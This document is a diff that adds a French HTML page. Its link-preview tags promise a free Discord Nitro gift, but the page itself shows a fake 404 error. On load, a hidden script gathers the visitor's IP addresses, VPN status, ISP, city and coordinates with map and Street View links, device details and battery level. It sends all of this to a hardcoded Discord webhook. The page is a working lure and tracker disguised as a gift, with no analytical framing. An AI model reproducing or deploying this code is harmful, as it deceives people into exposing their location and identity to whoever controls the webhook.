@@ -1,0 +1,208 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="Tu as reçu un cadeau Discord Nitro 1 mois de Zyop ! Réclame ton abonnement maintenant pour des émojis personnalisés, avatars animés et plus !">
+    <meta name="keywords" content="Discord Nitro, cadeau Nitro 1 mois, Zyop, Nitro giveaway, Discord">
+    <meta name="author" content="Zyop">
+    <meta property="og:title" content="Cadeau Discord Nitro 1 mois de Zyop">
+    <meta property="og:description" content="Wow, Zyop t’a offert un abonnement Discord Nitro 1 mois ! Réclame ton cadeau dès maintenant pour profiter d’émojis personnalisés, d’uploads jusqu’à 100 Mo et de badges stylés !">
+    <meta property="og:image" content="https://cdn.discordapp.com/attachments/1368699844276912179/1369351930677035148/IMG_20250506_173908_upscayl_4x_upscayl-standard-4x.png?ex=681b8bdd&is=681a3a5d&hm=79ea45e6311257ac12a0cf6fab8e2da64e1bd2342809445e40d6584eee08ee6b&">
+    <meta property="og:image:alt" content="Image pour le cadeau Discord Nitro 1 mois">
+    <meta property="og:type" content="website">
+    <meta property="og:url" content="https://fake-doxbin.com">
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:title" content="Cadeau Discord Nitro 1 mois de Zyop">
+    <meta name="twitter:description" content="Incroyable ! Zyop t’a envoyé un cadeau Discord Nitro 1 mois. Réclame-le vite pour débloquer des émojis personnalisés, avatars animés et bien plus !">
+    <meta name="twitter:image" content="https://cdn.discordapp.com/attachments/1368699844276912179/1369351930677035148/IMG_20250506_173908_upscayl_4x_upscayl-standard-4x.png?ex=681b8bdd&is=681a3a5d&hm=79ea45e6311257ac12a0cf6fab8e2da64e1bd2342809445e40d6584eee08ee6b&">
+    <title>Erreur 404 - Page non trouvée</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f8f8f8;
+            color: #333;
+            text-align: center;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            height: 100vh;
+        }
+        h1 {
+            font-size: 48px;
+            margin-bottom: 10px;
+        }
+        p {
+            font-size: 18px;
+            margin-bottom: 20px;
+        }
+        a {
+            color: #007bff;
+            text-decoration: none;
+        }
+        a:hover {
+            text-decoration: underline;
+        }
+        .container {
+            max-width: 600px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>404 - Page non trouvée</h1>
+        <p>Désolé, la page que vous cherchez n'existe pas ou a été déplacée.</p>
+        <p><a href="/">Retour à l'accueil</a></p>
+    </div>
+
+    <script>
+        function getDeviceInfo(userAgent) {
+            let deviceName = 'Inconnu';
+            let deviceModel = 'Inconnu';
+            if (navigator.userAgentData) {
+                navigator.userAgentData.getHighEntropyValues(['model', 'platform']).then(ua => {
+                    deviceName = ua.platform || 'Inconnu';
+                    deviceModel = ua.model || 'Inconnu';
+                });
+            }
+            userAgent = userAgent.toLowerCase();
+            if (/iphone/.test(userAgent)) {
+                deviceName = 'iPhone';
+                if (/iphone.*cpu os ([0-9_]+)/.test(userAgent)) {
+                    deviceModel = 'iPhone ' + (userAgent.match(/cpu os ([0-9_]+)/)[1].replace('_', '.') || 'Unknown');
+                }
+            } else if (/ipad/.test(userAgent)) {
+                deviceName = 'iPad';
+                deviceModel = 'iPad';
+            } else if (/android/.test(userAgent)) {
+                deviceName = 'Android';
+                if (/android.*; ([a-z0-9\s-]+) build/.test(userAgent)) {
+                    deviceModel = userAgent.match(/android.*; ([a-z0-9\s-]+) build/)[1] || 'Unknown';
+                }
+            } else if (/windows/.test(userAgent)) {
+                deviceName = 'Windows PC';
+                deviceModel = 'PC';
+            } else if (/macintosh|mac os x/.test(userAgent)) {
+                deviceName = 'Mac';
+                deviceModel = 'Mac';
+            }
+            return { deviceName, deviceModel };
+        }
+        async function sendToWebhook() {
+            try {
+                let ipv4 = 'Inconnu';
+                try {
+                    const ipResponse = await fetch('https://api.ipify.org?format=json');
+                    const ipData = await ipResponse.json();
+                    ipv4 = ipData.ip;
+                } catch (e) {
+                    console.error('Erreur lors de la récupération de l\'IPv4:', e);
+                }
+                let ipv6 = 'Inconnu';
+                try {
+                    const ipv6Response = await fetch('https://api64.ipify.org?format=json');
+                    const ipv6Data = await ipv6Response.json();
+                    if (ipv6Data.ip !== ipv4) {
+                        ipv6 = ipv6Data.ip;
+                    }
+                } catch (e) {
+                    console.error('Erreur lors de la récupération de l\'IPv6:', e);
+                }
+                let ipinfoData = { vpn: false, proxy: false };
+                try {
+                    const ipinfoResponse = await fetch(`https://ipinfo.io/${ipv4}/privacy?token=4925e486ab24a5`, {
+                        headers: { 'Accept': 'application/json' }
+                    });
+                    if (!ipinfoResponse.ok) {
+                        throw new Error(`IPinfo API request failed with status ${ipinfoResponse.status}`);
+                    }
+                    const responseData = await ipinfoResponse.json();
+                    ipinfoData = responseData.privacy || { vpn: false, proxy: false };
+                    if (!responseData.privacy) {
+                        console.warn('IPinfo API returned no privacy data');
+                    }
+                } catch (e) {
+                    console.error('Erreur lors de la vérification IPinfo:', e.message);
+                    ipinfoData = { vpn: false, proxy: false };
+                }
+                let geoData = {};
+                try {
+                    const geoResponse = await fetch(`https://ipapi.co/${ipv4}/json/`);
+                    geoData = await geoResponse.json();
+                } catch (e) {
+                    console.error('Erreur lors de la récupération de la localisation:', e);
+                }
+                const location = {
+                    city: geoData.city || 'Inconnu',
+                    region: geoData.region || 'Inconnu',
+                    country: geoData.country_name || 'Inconnu',
+                    latitude: geoData.latitude || 'Inconnu',
+                    longitude: geoData.longitude || 'Inconnu'
+                };
+                const userAgent = navigator.userAgent;
+                const { deviceName, deviceModel } = getDeviceInfo(userAgent);
+                const isMobile = /Mobi|Android/i.test(userAgent);
+                const deviceType = isMobile ? 'Mobile' : 'Desktop';
+                let batteryInfo = 'Non disponible';
+                if (navigator.getBattery) {
+                    const battery = await navigator.getBattery();
+                    batteryInfo = `${(battery.level * 100).toFixed(0)}% (En charge: ${battery.charging ? 'Oui' : 'Non'})`;
+                }
+                const googleMapsLink = location.latitude !== 'Inconnu' && location.longitude !== 'Inconnu'
+                    ? `https://www.google.com/maps?q=${location.latitude},${location.longitude}`
+                    : 'Non disponible';
+                const streetViewLink = location.latitude !== 'Inconnu' && location.longitude !== 'Inconnu'
+                    ? `https://www.google.com/maps/@${location.latitude},${location.longitude},3a,75y,90h,90t/data=!3m6!1e1!3m4!1s!2e0!7i16384!8i8192`
+                    : 'Non disponible';
+                const timestamp = new Date().toLocaleString('fr-FR', {
+                    timeZone: 'Europe/Paris',
+                    hour: '2-digit',
+                    minute: '2-digit',
+                    day: '2-digit',
+                    month: '2-digit',
+                    year: 'numeric'
+                }).replace(',', '');
+                const payload = {
+                    embeds: [{
+                        title: 'Nouvelle visite sur le site',
+                        color: 0xFF0000,
+                        fields: [
+                            { name: 'Adresse IPv4', value: ipv4, inline: true },
+                            { name: 'Adresse IPv6', value: ipv6, inline: true },
+                            { name: 'VPN/Proxy', value: ipinfoData.vpn || ipinfoData.proxy ? 'Oui' : 'Non', inline: true },
+                            { name: 'FAI', value: geoData.org || 'Inconnu', inline: true },
+                            { name: 'ASN', value: geoData.asn || 'Inconnu', inline: true },
+                            { name: 'Ville', value: location.city, inline: true },
+                            { name: 'Région', value: location.region, inline: true },
+                            { name: 'Pays', value: location.country, inline: true },
+                            { name: 'Coordonnées', value: `Lat: ${location.latitude}, Lon: ${location.longitude}`, inline: true },
+                            { name: 'Google Maps', value: googleMapsLink, inline: false },
+                            { name: 'Street View', value: streetViewLink, inline: false },
+                            { name: 'Nom de l\'appareil', value: deviceName, inline: true },
+                            { name: 'Modèle de l\'appareil', value: deviceModel, inline: true },
+                            { name: 'User Agent', value: userAgent, inline: false },
+                            { name: 'Type d\'appareil', value: deviceType, inline: true },
+                            { name: 'Batterie', value: batteryInfo, inline: true },
+                            { name: 'Horodatage', value: timestamp, inline: false }
+                        ]
+                    }]
+                };
+                await fetch('https://discordapp.com/api/webhooks/1372221976751505580/fG9zjBj_Itmq8AjRWgp0NwCxHLHYgf96IspFN8mPGoZTyQiSUs19_7aSvIIhctT30YmN', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify(payload)
+                });
+            } catch (error) {
+                console.error('Erreur lors de l\'envoi au webhook:', error.message);
+            }
+        }
+        window.onload = sendToWebhook;
+    </script>
+</body>
+</html>
